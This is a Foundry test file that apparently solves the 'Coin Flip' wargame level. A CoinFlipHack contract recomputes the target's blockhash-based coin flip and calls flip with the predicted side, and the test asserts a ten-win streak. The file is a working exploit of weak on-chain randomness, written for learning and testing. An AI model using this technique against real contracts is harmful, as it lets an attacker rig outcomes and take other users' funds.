pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {CoinFlip} from "../03 coin flip/CoinFlip.sol";

contract CoinFlipTest is Test {
    address constant CONTRACT = address(42_000);
    address constant ATTACKER = address(42_001);
    CoinFlip coinflipContract;
    CoinFlipHack hackContract;

    function setUp() public {
        // Set general test settings
        vm.roll(1);
        vm.warp(100);
        vm.deal(CONTRACT, 1000000000000000000);
        vm.deal(ATTACKER, 1000000000000000000);

        vm.prank(CONTRACT);
        coinflipContract = new CoinFlip();
        vm.prank(ATTACKER);
        hackContract = new CoinFlipHack(address(coinflipContract));

        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 100);
    }

    function test_coinflip() public {
        console.log(" ");
        console.log("====== INIT ======");
        uint256 winStreak = coinflipContract.consecutiveWins();
        assertEq(winStreak, 0);
        console.log("Win streak : ");
        console.log(winStreak);

        console.log(" ");
        console.log("====== STEP 1 ======");

        for (uint256 i = 0; i < 10; ++i) {
            vm.roll(block.number + 1);
            vm.prank(ATTACKER);
            hackContract.attack();
        }
        uint256 winStreakFinal = coinflipContract.consecutiveWins();
        assertEq(winStreakFinal, 10);
        console.log("Win streak : ");
        console.log(winStreakFinal);
    }
}

contract CoinFlipHack {
    CoinFlip public victim;

    constructor(address coinflipAddress) {
        victim = CoinFlip(coinflipAddress);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue /
            57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool side = coinFlip == 1 ? true : false;
        victim.flip(side);
    }
}
